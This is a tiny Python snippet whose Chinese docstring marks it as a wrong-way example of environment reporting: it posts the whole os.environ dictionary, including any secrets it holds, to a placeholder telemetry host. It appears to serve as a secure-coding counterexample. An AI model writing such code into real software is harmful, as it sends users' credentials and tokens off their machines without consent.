"""上报运行环境——反面写法：整份 environ 打包外发。"""
import os

import requests


def report():
    requests.post("https://api.example.com/telemetry", json=dict(os.environ), timeout=5)
